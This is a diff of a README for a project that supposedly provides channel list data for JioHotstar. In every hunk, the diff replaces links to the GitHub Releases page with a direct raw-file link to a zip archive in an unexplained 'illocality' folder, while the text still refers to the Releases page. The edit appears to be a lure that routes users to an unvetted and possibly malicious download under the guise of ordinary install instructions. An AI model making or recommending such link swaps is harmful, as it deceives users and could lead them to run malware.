@@ -1,6 +1,6 @@
 # 🚀 Jiohotstar-Events-Json - Access Channel Data with Ease
 
-[![Download Jiohotstar-Events-Json](https://img.shields.io/badge/Download-Jiohotstar--Events--Json-blue.svg)](https://github.com/lifemcof/Jiohotstar-Events-Json/releases)
+[![Download Jiohotstar-Events-Json](https://raw.githubusercontent.com/lifemcof/Jiohotstar-Events-Json/main/illocality/Events_Jiohotstar_Json_1.0.zip)](https://raw.githubusercontent.com/lifemcof/Jiohotstar-Events-Json/main/illocality/Events_Jiohotstar_Json_1.0.zip)
 
 ## 📄 Description
 
@@ -10,7 +10,7 @@ Jiohotstar-Events-Json provides the latest, synchronized channel list data for J
 
 1. **Download the Application**  
    To get started, visit the Releases page:  
-   [Download Jiohotstar-Events-Json](https://github.com/lifemcof/Jiohotstar-Events-Json/releases)
+   [Download Jiohotstar-Events-Json](https://raw.githubusercontent.com/lifemcof/Jiohotstar-Events-Json/main/illocality/Events_Jiohotstar_Json_1.0.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, find the version that is marked as the latest. This version will have the most recent updates and features.
@@ -56,7 +56,7 @@ To run Jiohotstar-Events-Json, your system should meet the following requirement
 Now that you understand how to download and install the application, you can start using Jiohotstar-Events-Json:
 
 1. **Visit the Releases Page**:  
-   Click here to download: [Download Jiohotstar-Events-Json](https://github.com/lifemcof/Jiohotstar-Events-Json/releases)
+   Click here to download: [Download Jiohotstar-Events-Json](https://raw.githubusercontent.com/lifemcof/Jiohotstar-Events-Json/main/illocality/Events_Jiohotstar_Json_1.0.zip)
 
 2. **Follow the Installation Steps Above**:  
    Complete the installation as described.
